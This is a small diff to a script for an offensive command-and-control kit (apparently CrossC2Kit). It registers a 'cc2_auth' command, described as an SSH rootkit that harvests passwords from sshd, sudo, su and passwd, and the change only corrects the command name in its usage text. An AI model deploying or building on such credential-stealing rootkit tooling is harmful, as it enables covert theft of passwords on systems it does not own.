@@ -2,7 +2,7 @@
 include(script_resource("CrossC2Kit.cna"));
 
 sub printUsage_auth {
-    blog($1, "\nUsage: cc2_auth <linux(32)/osx> <step> (lib_name)\n\troot permissions\nssh rootkit: Get password for auth action(sshd/sudo/su/passwd...).\n\tstep: \t<install>, <run>, <uninstall>.\n\n\tstep 1. install: \tget a prepared dynamic library file `libxxx.0.0.1.so`.\n\tstep 2. run: \tstart running ssh rootkit.\n\tstep 3. uninstall: \tuninstall ssh rootkit.\nEx:\n\tcc2_ssh linux install\n\tcc2_ssh linux run\n\tcc2_ssh linux uninstall libxxx.0.0.1.so\n");
+    blog($1, "\nUsage: cc2_auth <linux(32)/osx> <step> (lib_name)\n\troot permissions\nssh rootkit: Get password for auth action(sshd/sudo/su/passwd...).\n\tstep: \t<install>, <run>, <uninstall>.\n\n\tstep 1. install: \tget a prepared dynamic library file `libxxx.0.0.1.so`.\n\tstep 2. run: \tstart running ssh rootkit.\n\tstep 3. uninstall: \tuninstall ssh rootkit.\nEx:\n\tcc2_auth linux install\n\tcc2_auth linux run\n\tcc2_auth linux uninstall libxxx.0.0.1.so\n");
 }
 
 ssh_alias cc2_auth {
@@ -66,4 +66,4 @@ ssh_alias cc2_auth {
     }
 }
 
-ssh_command_register("cc2_auth", "CrossC2 auth rootkit - Get password for auth action(sshd/sudo/su/passwd...).", "\nUsage: cc2_auth <linux(32)/osx> <step> (lib_name)\n\troot permissions\nssh rootkit: Get password for auth action(sshd/sudo/su/passwd...).\n\tstep: \t<install>, <run>, <uninstall>.\n\n\tstep 1. install: \tget a prepared dynamic library file `libxxx.0.0.1.so`.\n\tstep 2. run: \tstart running ssh rootkit.\n\tstep 3. uninstall: \tuninstall ssh rootkit.\nEx:\n\tcc2_ssh linux install\n\tcc2_ssh linux run\n\tcc2_ssh linux uninstall libxxx.0.0.1.so\n");
+ssh_command_register("cc2_auth", "CrossC2 auth rootkit - Get password for auth action(sshd/sudo/su/passwd...).", "\nUsage: cc2_auth <linux(32)/osx> <step> (lib_name)\n\troot permissions\nssh rootkit: Get password for auth action(sshd/sudo/su/passwd...).\n\tstep: \t<install>, <run>, <uninstall>.\n\n\tstep 1. install: \tget a prepared dynamic library file `libxxx.0.0.1.so`.\n\tstep 2. run: \tstart running ssh rootkit.\n\tstep 3. uninstall: \tuninstall ssh rootkit.\nEx:\n\tcc2_auth linux install\n\tcc2_auth linux run\n\tcc2_auth linux uninstall libxxx.0.0.1.so\n");
